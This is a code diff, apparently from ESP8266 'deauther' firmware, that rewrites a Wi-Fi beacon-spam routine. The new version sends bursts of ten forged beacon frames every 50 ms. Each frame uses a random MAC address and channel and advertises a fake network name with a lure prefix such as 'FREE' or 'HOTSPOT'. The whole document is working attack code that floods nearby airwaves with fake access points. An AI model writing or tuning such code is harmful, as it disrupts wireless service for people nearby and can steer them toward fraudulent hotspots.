@@ -199,34 +199,38 @@ void stopBeaconAttack()
 
 void updateBeacon()
 {
-  if (beaconActive && (millis() - lastAttackPacketAt > 100))
-  { // Envia a cada 100ms
-    // Generate random MAC
-    uint8_t mac[6];
-    for (int i = 0; i < 6; i++)
-      mac[i] = random(256);
-
-    // Set MAC in packet
-    memcpy(&beaconPacket[10], mac, 6);
-    memcpy(&beaconPacket[16], mac, 6);
-
-    // Set channel
-    beaconPacket[56] = deautherChannel;
-
-    // Generate random SSID
-    String ssid = "FAKE" + String(random(1000));
-    int len = ssid.length();
-    beaconPacket[37] = len;
-    for (int i = 0; i < len; i++)
+  if (beaconActive && (millis() - lastAttackPacketAt > 50))
+  { // Envia a cada 50ms
+    for (int i = 0; i < 10; i++)
     {
-      beaconPacket[38 + i] = ssid[i];
+      // Generate random MAC
+      uint8_t mac[6];
+      for (int j = 0; j < 6; j++)
+        mac[j] = random(256);
+
+      // Set MAC in packet
+      memcpy(&beaconPacket[10], mac, 6);
+      memcpy(&beaconPacket[16], mac, 6);
+
+      // Set channel
+      beaconPacket[56] = random(1, 12); // Random channel
+
+      // Generate random SSID
+      String prefixes[5] = {"FREE", "HOTSPOT", "WIFI", "NET", "LAN"};
+      String ssid = prefixes[random(5)] + String(random(9999));
+      int len = ssid.length();
+      beaconPacket[37] = len;
+      for (int j = 0; j < len; j++)
+      {
+        beaconPacket[38 + j] = ssid[j];
+      }
+
+      wifi_set_channel(beaconPacket[56]);
+      delay(1);
+
+      wifi_send_pkt_freedom(beaconPacket, 109, 0);
+      beaconPacketsSent++;
     }
-
-    wifi_set_channel(deautherChannel);
-    delay(10);
-
-    wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
-    beaconPacketsSent++;
     lastAttackPacketAt = millis();
   }
 }
